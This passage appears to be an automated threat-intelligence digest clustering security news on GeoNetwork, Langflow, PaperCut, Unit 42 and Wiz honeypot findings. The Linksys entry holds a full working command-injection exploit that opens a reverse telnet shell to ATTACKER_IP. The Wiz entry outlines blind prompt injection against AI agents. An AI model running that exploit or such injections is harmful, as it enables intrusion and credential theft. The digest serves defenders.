Two vulnerabilities in GeoNetwork can be chained to achieve unauthenticated remote code execution (RCE) on the open-source geospatial metadata catalog, which sits behind many government and agency geoportals. The project shipped fixes in versions 4.4.12 and 4.2.17 on July 8, 2026, and published the vulnerability details on August 31. GeoNetwork originated at the United Nations Food and
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: GeoNetwork Fixes Unauthenticated RCE Chain Affecting Government Geoportal Backends
  - Published: 2026-09-02T09:18:02+00:00
  - Link: https://thehackernews.com/2026/09/geonetwork-fixes-unauthenticated-rce.html
  - Summary: Two vulnerabilities in GeoNetwork can be chained to achieve unauthenticated remote code execution (RCE) on the open-source geospatial metadata catalog, which sits behind many government and agency geoportals. The project shipped fixes in versions 4.4.12 and 4.2.17 on July 8, 2026, and published the vulnerability details on August 31. GeoNetwork originated at the United Nations Food and

### Cluster a8ec64c446 — score 15

- Title: Critical Langflow flaw exploited to steal OpenAI and AWS keys
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-01T17:54:22+00:00
- Link: https://www.bleepingcomputer.com/news/security/critical-langflow-flaw-exploited-to-steal-openai-and-aws-keys/
- Fetch status: ok
- Member count: 9
- Corroborating source count: 6
- Strong signals: AWS, CVE-2026-0768, OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: government
- affected_products: AWS, Ivanti, OpenAI/ChatGPT
- cve_ids: CVE-2026-0768, CVE-2026-0770, CVE-2026-33017, CVE-2026-5027, CVE-2026-55255, CVE-2026-66066
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: OpenAI/ChatGPT, AWS, Ivanti
- cve_ids: CVE-2026-0768, CVE-2026-33017, CVE-2026-5027, CVE-2026-55255, CVE-2026-0770
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors are exploiting an unauthenticated remote code execution vulnerability (CVE-2026-0768) in Langflow, an open-source framework for building AI applications, to steal credentials, tokens, and keys. [...]
```

#### Full body

```
Critical Langflow flaw exploited to steal OpenAI and AWS keys By Bill Toulas September 1, 2026 01:54 PM 0 Threat actors are exploiting an unauthenticated remote code execution vulnerability (CVE-2026-0768) in Langflow, an open-source framework for building AI applications, to steal credentials, tokens, and keys. The security issue received a critical severity rating and resides in the code validator of Langflow’s custom component editor. Threat intelligence company VulnCheck detected the activity on its honeypots in the U.K. that were targeted in at least 50 exploitation attempts over the weekend, with attack traffic originating primarily from Russia. VulnCheck lead security researcher Caitlin Condon said that the activity intensified and the total number of observed attacks increased to 360 as of today. According to Condon, the attacker conducts reconnaissance and queries environment variables to harvest administrative credentials or superuser authentication keys for Langflow instances, AWS secrets, and OpenAI API keys. “Among other things, attacker requests are querying environment variables (LANGFLOW_SUPERUSER, OPENAI_API*, AWS_ACCESS*, AWS_SECRET*), reading /root/.cache/langflow/secret_key, and checking .ssh access and .bash_history size,” Condon explained . Langflow is an open-source , Python-based low-code platform for building AI applications, agents, chatbots, and retrieval-augmented generation (RAG) systems. It lets users create workflows in a graphical interface by connecting components for language models, prompts, databases, APIs, and other tools. The CVE-2026-0768 vulnerability was disclosed in January and affects Langflow versions 1.4.2 and earlier. It allows executing arbitrary code without authentication with root privileges. "The specific flaw exists within the handling of the code parameter provided to the validate endpoint. The issue results from the lack of proper validation of a user-supplied string before using it to execute Python code," reads the vulnerability's description . Trend Micro’s Zero Day Initiative notes that it results from the lack of proper validation of a user-supplied string before using it to execute Python code. Condon says that there are no known public proof-of-concept (PoC) exploits. CVE-2026-0768 isn’t the first Langflow vulnerability that exploited this year. In March, attackers leveraged CVE-2026-33017 , a critical code-injection flaw, within about a day of its disclosure, and used it to execute Python scripts and to harvest .ENV and database files. This was followed by attacks exploiting CVE-2026-5027 to write arbitrary files to vulnerable servers and CVE-2026-55255 to access other users’ AI workflows, steal sensitive data, and deliver second-stage implants. Attackers also exploited CVE-2026-0770 to execute commands with root privileges and attempted to deploy malware and extract cloud credentials, environment variables, and container metadata. More recently, CISA warned that CVE-2026-9198 was being exploited after multiple proof-of-concept exploits became publicly available. Langflow users are recommended to upgrade to the latest available version, 1.11.6, which addresses all known flaws in the popular tool. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: CISA orders urgent action on actively exploited Langflow RCE flaw Critical Langflow RCE flaw exploited to hack AI app servers Hackers exploit Sangoma Switchvox flaw to deploy reverse shells Critical Avada WordPress theme flaw enables zero-click RCE One threat actor responsible for 83% of recent Ivanti RCE attacks
```

#### Corroborating sources (6)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Critical Langflow flaw exploited to steal OpenAI and AWS keys
  - Published: 2026-09-01T17:54:22+00:00
  - Link: https://www.bleepingcomputer.com/news/security/critical-langflow-flaw-exploited-to-steal-openai-and-aws-keys/
  - Summary: Threat actors are exploiting an unauthenticated remote code execution vulnerability (CVE-2026-0768) in Langflow, an open-source framework for building AI applications, to steal credentials, tokens, and keys. [...]
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Critical Langflow Vulnerability Exploited as Attacks on AI Platform Rise
  - Published: 2026-09-01T20:48:52+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/critical-langflow-flaw-exploited-attacks-rise
  - Summary: The attacks targeting CVE-2026-0768 are the latest threat against the low-code AI development platform, which is receiving more attention from adversaries this year.
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Bring Orca Security Context Into the AWS Console with the Orca Browser Extension
  - Published: 2026-09-02T14:11:59+00:00
  - Link: https://orca.security/resources/blog/orca-security-browser-extension-aws-console/
  - Summary: Key Takeaways The Cost of Switching Tabs Cloud engineers and developers live in the AWS console, not in a security platform. So when a question comes up about a resource’s risk, the only path has been to stop, open a new tab, and go looking for that asset inside their security tooling. That detour costs […]
- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Managing identity source transition for AWS IAM Identity Center
  - Published: 2026-09-02T20:36:31+00:00
  - Link: https://aws.amazon.com/blogs/security/managing-identity-source-transition-for-aws-iam-identity-center/
  - Summary: September 2, 2026: This post was republished to include Active Directory migration strategies and automation for permission sets. AWS IAM Identity Center manages user access to Amazon Web Services (AWS) resources, including both AWS accounts and applications. You can use IAM Identity Center to create and manage user identities within the Identity Center identity store […]
- **Simon Willison** (ai_security_agentic_risk)
  - Title: Codex bundles LibreOffice
  - Published: 2026-09-01T19:03:01+00:00
  - Link: https://simonwillison.net/2026/Sep/1/codex-libreoffice/
  - Summary: I was poking around in my ~/.cache/ folder using OmniDiskSweeper when I spotted something interesting. The OpenAI Codex desktop app (since rebranded to just ChatGPT) has 1.7GB of stuff in there in a folder called codex-primary-runtime , including a full Python installation, a full Node.js installation, and native binaries for Poppler , git, and the LibreOffice open source office suite (which forked from OpenOffice.org in 2010): The ~/.cache/codex-runtimes/codex-primary-runtime/plugins/openai-primary-runtime/plugins/documents folder includes skills which tell Codex how to find and use those binaries. Tags: codex , generative-ai , openai , ai , llms , openoffice , open-source
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity
  - Published: 2026-09-01T07:22:30+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-critical-langflow-and.html
  - Summary: Threat actors are exploiting two critical flaws impacting Langflow and Ruby on Rails, according to new findings from VulnCheck. The vulnerabilities in question are listed below - CVE-2026-0768 (CVSS score: 9.8) - A lack of proper validation of a user-supplied input vulnerability that could be exploited to execute arbitrary Python code in the context of the root user. CVE-2026-66066 aka

### Cluster ccafabb9aa — score 14

- Title: Frontier AI Changes Vulnerability Discovery. It Doesn’t Change How Breaches Happen.
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-08-31T13:38:40+00:00
- Link: https://horizon3.ai/intelligence/blogs/frontier-ai-vulnerability-discovery/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Frontier AI is accelerating vulnerability discovery, but breaches still depend on what attackers can do after initial compromise. See how Horizon3 and CrowdStrike connect attacker-derived evidence to defender action.
```

#### Full body

```
Frontier AI Changes Vulnerability Discovery. It Doesn’t Change How Breaches Happen. Stephen Gates August 31, 2026 Blogs Frontier AI is changing the economics of vulnerability discovery. Models are increasingly capable of finding, chaining, and exploiting vulnerabilities at machine speed, compressing timelines that once gave defenders more time to understand and remediate newly discovered weaknesses. CrowdStrike’s Project QuiltWorks is bringing together frontier AI, security technology, services, cloud infrastructure, and other capabilities to help organizations respond to this new reality. CrowdStrike is now expanding QuiltWorks across its technology ecosystem, bringing data from Horizon3 and other security providers into Falcon® Next-Gen SIEM to deepen attack-path analysis, enrich prioritization, and accelerate remediation. For Horizon3, there is a simple idea behind our participation: Frontier AI changes how vulnerabilities are discovered. It doesn’t change how breaches happen. Finding a vulnerability is only the beginning. The outcome depends on what an attacker can do after gaining access. The real question starts after initial compromise Security teams have spent decades trying to identify and remediate vulnerabilities before attackers exploit them. That remains essential, but frontier AI makes it increasingly unrealistic to assume organizations will find and fix every vulnerability before an attacker gets there. There will always be another vulnerability, another exposed system, another path to initial access. So the more important question is not simply whether a vulnerability can be exploited. It is: If one of my systems is compromised, what happens next? Can the attacker harvest credentials and use them elsewhere? Can they escalate privileges or move laterally? Can they cross network or identity boundaries? Can they reach Active Directory, Entra ID, cloud environments, or sensitive data? Do endpoint and other security controls detect and stop their activity? How large is the potential blast radius? Those questions determine whether an initial compromise remains contained or becomes a business-impacting breach. Consider two organizations running the same vulnerable technology. An attacker compromises the same type of system in both environments. In the first, harvested credentials and excessive privileges provide a path into critical infrastructure and sensitive data. In the second, segmentation, identity controls, endpoint security, and least privilege stop the attacker from progressing. The vulnerability is the same. The consequences are not. That difference is cyber resilience . Cyber resilience starts with assumed breach The accelerating pace of vulnerability discovery makes an assumed-breach mindset even more important. Assumed breach does not mean abandoning prevention or vulnerability remediation. Organizations should continue identifying and fixing vulnerabilities as quickly as practical. But cyber resilience cannot depend on eliminating every possible path to initial compromise before an attacker finds it. Instead, assume initial compromise is possible and continuously test what happens next. This mindset is already fundamental to how NodeZero® tests environments. Internal pentesting provides a clear example because the test begins from the perspective of an attacker or malicious insider who already has access to the network. From there, NodeZero tests the opportunities available to the attacker and chains weaknesses together to determine what they can ultimately compromise. The same principle extends across the attack surface. Initial access might come through an internet-facing system, a web application, exposed credentials, an identity weakness, a cloud misconfiguration, or another exploitable condition. Once access is established, the question becomes what that access enables. The entry point may change. What matters is what the attacker can do next. Weak credentials, excessive privileges, misconfiguration
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Frontier AI Changes Vulnerability Discovery. It Doesn’t Change How Breaches Happen.
  - Published: 2026-08-31T13:38:40+00:00
  - Link: https://horizon3.ai/intelligence/blogs/frontier-ai-vulnerability-discovery/
  - Summary: Frontier AI is accelerating vulnerability discovery, but breaches still depend on what attackers can do after initial compromise. See how Horizon3 and CrowdStrike connect attacker-derived evidence to defender action.

### Cluster df5dc53845 — score 14

- Title: [webapps] Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-08-31T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52660
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: GitHub
- cve_ids: CVE-2025-60689
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_products: GitHub
- cve_ids: CVE-2025-60689
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Linksys E1200_2.0.04 - Unauthenticated OS Command Injection EDB-ID: 52660 CVE: 2025-60689 EDB Verified: Author: jarrett Type: webapps Exploit: / Platform: Hardware Date: 2026-08-31 Vulnerable App: # Exploit Title: Linksys E1200_2.0.04 - Unauthenticated OS Command Injection # Date: 2026-07-22 # Exploit Author: JarrettgxzSec # Vendor Homepage: www.linksys.com # Version: FW <= v2.0.04 # Tested on: v2.0.02 & v2.0.04, directly connected to the LAN # CVE: CVE-2025-60689 # Github repository: https://github.com/Jarrettgohxz/CVE-research/tree/main/Linksys/E1200-V2/CVE-2025-60689 import sys import socket import threading import time from urllib.parse import quote if len(sys.argv) < 4: print(f"[!] Usage: python3 {sys.argv[0]} <ATTACKER_IP> <TARGET_IP> <TARGET_PORT>") print(f"[!] Example: python3 {sys.argv[0]} 192.168.1.100 192.168.1.1 8080") sys.exit(1) ATTACKER_IP = sys.argv[1] TARGET_IP = sys.argv[2] TARGET_PORT = sys.argv[3] SHELL_PORT = 8888 def start_shell_listener(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind(('0.0.0.0', SHELL_PORT)) print(f"[*] Listening for shell on port {SHELL_PORT}...") s.listen(1) conn, addr = s.accept() print(f"[+] Connection received from {addr[0]}") # allows interactive interaction conn.setblocking(True) conn.settimeout(0.5) while True: # send command to the router cmd = input("# ") conn.send((cmd + "\n").encode()) # receive output from the router try: while True: # keep reading until the device stops sending chunk = conn.recv(4096).decode(errors='ignore') if not chunk: print("\n[!] Connection closed by target.") return print(chunk, end="", flush=True) # timeout decided by the conn.settimeout() method previously except socket.timeout: # this is expected when the device is done sending text pass def execute_exploit(): print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}...") # 1. Build the payload payload = "\nrm /tmp/f \n" payload += "mkfifo /tmp/f \n" payload += "killall httpd && httpd \n" payload += f"cat /tmp/f | /bin/sh 2>&1 | telnet {ATTACKER_IP} {SHELL_PORT} > /tmp/f &\n" payload = quote(f" {payload}") post_data = "submit_button=&" post_data += "change_action=&" post_data += "submit_type=&" post_data += "action=&" post_data += "commit=0&" post_data += "ttcp_num=&" post_data += "ttcp_size=&" post_data += f"ttcp_ip={payload}&" post_data += "StartEPI=1" post_data = post_data.encode() # 2. Build the HTTP POST body http_req = f"POST /tmUnblock.cgi HTTP/1.1\r\n" http_req += f"Host: {TARGET_IP}\r\n" http_req += "Content-Type: application/x-www-form-urlencoded\r\n" http_req += f"Content-Length: {len(post_data)}\r\n" http_req += "Connection: close\r\n" http_req += "\r\n" http_req = http_req.encode() + post_data try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(10) s.connect((TARGET_IP, TARGET_PORT)) s.sendall(http_req) except Exception as e: print(f"[!] Error: {e}") if __name__ == "__main__": # start the shell listener in the background listener_thread = threading.Thread(target=start_shell_listener) listener_thread.daemon = True listener_thread.start() # short sleep to ensure the listener is bound and ready time.sleep(1) # execute the exploit function execute_exploit() # keep main thread alive to interact with the shell while listener_thread.is_alive(): time.sleep(1) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber R
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [webapps] Linksys E1200_2.0.04 - Unauthenticated OS Command Injection
  - Published: 2026-08-31T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52660
  - Summary: Linksys E1200_2.0.04 - Unauthenticated OS Command Injection

### Cluster 205332731c — score 13

- Title: PaperCut Zero-Day Exploited in Attacks, Affecting All NG and MF Versions
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-28T08:25:36+00:00
- Link: https://thehackernews.com/2026/08/papercut-zero-day-exploited-in-attacks.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, supply_chain, zero_day
- actor_attribution: Cl0p, LockBit, TeamPCP
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: GitLab, Gitea, OpenAI/ChatGPT
- cve_ids: CVE-2023-27350, CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, critical_cvss, emergency_patch, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, active_exploitation
- actor_attribution: LockBit, Cl0p, TeamPCP
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: OpenAI/ChatGPT, GitLab, Gitea
- cve_ids: CVE-2023-27350, CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, zero_day, preauth_unauth, emergency_patch, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
PaperCut has alerted customers that bad actors are actively exploiting a vulnerability impacting all versions of its PaperCut NG and PaperCut MF print management software in zero-day attacks. The company has released an emergency patch for v25 and v26 to address the issue. It said it's "aware of confirmed customer incidents and is treating this matter with the highest priority." An
```

#### Full body

```
PaperCut Zero-Day Exploited in Attacks, Affecting All NG and MF Versions  Ravie Lakshmanan  Aug 28, 2026 Vulnerability / Enterprise Security PaperCut has alerted customers that bad actors are actively exploiting a vulnerability impacting all versions of its PaperCut NG and PaperCut MF print management software in zero-day attacks. The company has released an emergency patch for v25 and v26 to address the issue. It said it's "aware of confirmed customer incidents and is treating this matter with the highest priority." An investigation into the incident is ongoing. The following indicators of compromise have been shared so far - Alerts from intrusion-detection, endpoint-security, or network-monitoring tools involving the PaperCut Application Server, particularly suspicious post-exploitation activity from "pc-app.exe" Missing, unexpectedly truncated, or deleted PaperCut server.log files The presence of the below entries in "server.log" - ERROR No suitable driver found for jdbc:no:x ERROR DatabaseUtils - Database error looking up cardID: VALUES CAST There are currently no details about the flaw, how it is being exploited, or who is behind the efforts. Users who have PaperCut NG/MF Application Server exposed to the internet are advised to immediately restrict access to trusted IP addresses. "Use firewall rules, network access controls, or equivalent measures to ensure the PaperCut server’s web interfaces cannot be reached from untrusted internet addresses," PaperCut said. "Take this action now, even if you have not observed suspicious activity." In 2023, a critical flaw in PaperCut MF and NG ( CVE-2023-27350 , CVSS score: 9.8) was exploited by Russian threat actors as well as a financially motivated hacking group called Lace Tempest to deliver Cl0p and LockBit ransomware. Update The vulnerability under exploitation is an exploitation chain comprising CVE-2026-81578 and CVE-2026-82078 to enable remote code execution. Please check this story for more details. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  enterprise security , Vulnerability , Zero-Day ⚡ Top Stories This Week Critical Keycloak Password Reset Flaw Could Let Unauthenticated Attackers Take Over Any Account ⚡ Weekly Recap: AI-Powered PLC Attacks, GitLab Attacks, Stripe Key Leaks and More Actively Exploited Oracle WebLogic Flaw Lets Unauthenticated Attackers Access Critical Data WhatsApp Adds Multiple Passkeys for Phishing-Resistant Sign-Ins Across iOS and Android A Malicious Webpage Could Poison Your Local AI Model Behind NVIDIA NemoClaw Critical Gitea RCE Actively Exploited as Reported Attack Drops Miner-Like Payload Claude Opus 4.6 Bypasses Gym Booking Limit, Cancels Other Users' Reservations in Tests CISA Red Team Compromised Two Critical Infrastructure Orgs, One Detected Nothing FBI Disrupts China-Linked QTFY Infrastructure Used to Steal Data From U.S. Organizations New GPUThor Rowhammer Defeats ECC on NVIDIA RTX A6000 to Gain Host Root Access Alleged TeamPCP Hackers Charged in Australia Over Major Supply Chain Attacks ThreatsDay: 296K IoT Botnet, 100+ Water Systems Targeted, SharePoint RCE Chain + 27 New Stories Next.js Patches Critical AVIF and Windows Flaws Enabling Unauthenticated RCE OpenAI Says Reward Hacking Drove AI Agents to Exploit Zero-Days and Breach Hugging Face Critical cPanel Flaw Could Let One Hosting Customer Take Root Control of a Whole Server PaperCut Zero-Day Exploited in Attacks, Affecting All NG and MF Versions Three CVSS 10.0 ServiceNow Flaws Could Let Unauthenticated Attackers Execute Code and SQL Attackers Chain Two PaperCut Flaws to Execute Code Without Authentication Learn How to Build Security Operations Ready for AI-Powered Attacks Imagine the SOC Without a Queue: From Alert Backlog to AI Hypothesis Engine Mirage2FA Surge Hits 4,500 US and EU Companies, Abusing Microsoft 365 Login Flows Frontier AI: Vulnerability
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PaperCut Zero-Day Exploited in Attacks, Affecting All NG and MF Versions
  - Published: 2026-08-28T08:25:36+00:00
  - Link: https://thehackernews.com/2026/08/papercut-zero-day-exploited-in-attacks.html
  - Summary: PaperCut has alerted customers that bad actors are actively exploiting a vulnerability impacting all versions of its PaperCut NG and PaperCut MF print management software in zero-day attacks. The company has released an emergency patch for v25 and v26 to address the issue. It said it's "aware of confirmed customer incidents and is treating this matter with the highest priority." An

### Cluster 4272e95241 — score 12

- Title: Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-03T10:00:58+00:00
- Link: https://unit42.paloaltonetworks.com/ai-tool-use-targeting-latam-orgs/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: critical_infrastructure, financial_services, government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services, government, critical_infrastructure
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Explore how attackers targeting Latin American entities use AI for data exfiltration and how basic OpSec errors allow defenders to disrupt operations. The post Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America 8 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services Cortex Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Reese Lewis Sara McBroom Published: September 3, 2026 Categories: Malware Threat Research Tags: Agentic AI ChatGPT CL-CRI-1131 CL-CRI-1163 Claude code Financial sector NextChat Shipping and Transportation SOCKS5 SockTz Share Executive Summary We have analyzed two ongoing, multi-stage network intrusion and data-exfiltration campaigns targeting organizations in Latin America. Corroborating recent findings from the broader threat intelligence community, we observed attackers leveraging artificial intelligence (AI) to enhance their capabilities. Our investigation categorizes this activity as follows: Mexican transportation campaign: This campaign impacted a transportation organization, alongside federal government ministries and municipal water utilities in Mexico and Ecuador. Operators relied on living-off-the-land (LotL) techniques. They executed iterative batch scripts to manipulate and exfiltrate sensitive data, and self-hosted NextChat instances on operational infrastructure. We track the activity in this cluster as CL-CRI-1131. Brazilian financial campaign: Attackers targeted the Brazilian financial sector. We observed an expansion of previously reported targeting of vulnerable web servers in a job-themed phishing campaign. The attackers employed custom remote access Trojans (RATs) and tunneling tools, including a Go-based SOCKS5 proxy with iterative filenames that suggest AI-enablement. We track the activity in this cluster as CL-CRI-1163. We track them as two separate activity clusters with distinct geographic focuses. However, the technical and behavioral overlaps between CL-CRI-1131 and CL-CRI-1163 highlight shifting trends in Latin American targeting and threat actor tooling. Both clusters have overlapping SOCKS5 relay infrastructure and they both rely on AI to orchestrate operations via commercial large language models (LLMs). This signals a broader evolution in the regional threat landscape. Rather than isolated incidents, these clusters demonstrate how diverse threat groups in Latin America are independently adopting advanced proxy networks and AI integration to streamline their execution. Palo Alto Networks customers are better protected from the threats discussed here through the following products and services: Advanced WildFire Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics AI , LLM , Phishing , RATs CL-CRI-1131: Mexican Transportation Campaign During an April 2026 compromise, the attacker’s host-based operations reflected the trial and error of LLM usage. Infrastructure associated with the campaign persisted into June 2026 and exposed targeting profiles of the attacker. Initial Host-Based Footprint: Execution Challenges During an intrusion as part of CL-CRI-1131 activity in April 2026, we observed the attacker struggling to gather sensitive data. After repeated attempts to dump the Security Account Manager (SAM) registry hive and the domain controller NTDS.dit file, the attacker created shadow copies across multiple drives before copying files, as shown in Figure 1. Figure 1. Volume shadow copy manipulation. This occurred while the attacker used a series of numbered batch scripts to collect sensitive data from the compromised host, as shown in Figure 2. Figure 2. Commands used for a series of batch scripts to collect sensitive data. The attackers inserted a permissions check to ensure successful file writing to the collection directory. These trial-and-error actions and successive script fixes are consistent with LLM usage. After struggling
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America
  - Published: 2026-09-03T10:00:58+00:00
  - Link: https://unit42.paloaltonetworks.com/ai-tool-use-targeting-latam-orgs/
  - Summary: Explore how attackers targeting Latin American entities use AI for data exfiltration and how basic OpSec errors allow defenders to disrupt operations. The post Attackers Expose Ongoing AI Tool Use Targeting Organizations in Latin America appeared first on Unit 42 .

### Cluster 2aa97aefff — score 12

- Title: YARA-X 1.20.0 Release, (Sun, Aug 30th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-08-30T07:14:49+00:00
- Link: https://isc.sans.edu/diary/rss/33288
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
YARA-X&#;x26;#;39;s 1.20.0 release brings 14 improvements and 13 bugfixes.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: YARA-X 1.20.0 Release, (Sun, Aug 30th)
  - Published: 2026-08-30T07:14:49+00:00
  - Link: https://isc.sans.edu/diary/rss/33288
  - Summary: YARA-X&#;x26;#;39;s 1.20.0 release brings 14 improvements and 13 bugfixes.

### Cluster a6bf88aa80 — score 12

- Title: Inside 90 days of attacks on AI infrastructure
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-08-27T16:33:16+00:00
- Link: https://www.wiz.io/blog/ai-infrastructure-honeypot
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, cloud_abuse, credential_theft
- affected_products: ChromaDB
- cve_ids: CVE-2026-42271, CVE-2026-59822
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: credential_theft, ai_security, cloud_abuse
- affected_products: ChromaDB
- cve_ids: CVE-2026-59822, CVE-2026-42271
- content_type: threat_research
- confidence_tier: tier_2_operator

#### Summary

```
Wiz honeypots uncover active campaigns targeting LiteLLM, MCP servers, and AI frameworks through RCE, blind prompt injection, and memory credential theft.
```

#### Full body

```
Wiz Threat Research operates honeypots across AI and ML services including LiteLLM, Flowise, LangChain, Langflow, ChromaDB, Ollama, and others. Over 90 days of telemetry, we observed sustained attack activity against AI infrastructure, with tooling adapted to the specific internals of each service. We’re sharing our findings with the community so that organizations can defend themselves against the techniques we’ve observed so far. The findings below are organized around three attack patterns: Exploiting Internet-facing MCP servers for remote code execution Blind prompt injection against AI agent frameworks AI-native post-exploitation, with tooling adapted specifically to AI infrastructure internals Why AI infrastructure matters as a cloud attack surface Wiz’s State of AI in the Cloud report found that 90% of cloud environments run self-hosted AI software , 81% run managed AI services, and 63% self-hosted AI models. That adoption makes AI infrastructure a mainstream cloud attack surface: the same services teams use to route model traffic, run notebooks, build agents, and connect tools now sit in paths that can expose credentials, data, and internal systems. AI infrastructure attracts attackers due to two key properties: Credential concentration. A LiteLLM proxy can hold keys for every model provider it routes to, including OpenAI, Anthropic, Azure, and Gemini. It may also run with cloud IAM permissions and connect to internal services through MCP tool servers. A single compromise can give an attacker access to the credentials and services downstream of the proxy, not just the proxy itself. Agent reachability. AI agents are designed to accept instructions from external inputs and act on them. This reachability, where inputs drive tool execution, makes them vulnerable to blind prompt injection. This vector allows attackers to execute instructions embedded in requests. Pattern 1: Targeting MCP servers MCP lets AI agents call external tool servers: databases, code repositories, Slack, internal APIs. Wiz Research previously documented the attack surface created by exposed MCP servers . In our honeypots, we observed two MCP-specific vulnerability classes being exploited against LiteLLM: an authentication bypass on the MCP gateway, and a command injection in the MCP server test endpoints that enables remote code execution. Earlier this year, Wiz Research discovered an authentication flaw in LiteLLM's MCP Gateway ( CVE-2026-59822 ). The vulnerability sits in the OAuth2 header handling: when token validation fails, rather than rejecting the request, the server returns an empty UserAPIKeyAuth() object with no restrictions. Any Bearer token (even just a single character, e.g., x) grants full MCP access. We observed exploitation of this vulnerability in our honeypots, with requests using single-character tokens to probe model enumeration endpoints: GET /v1/models HTTP/1.1 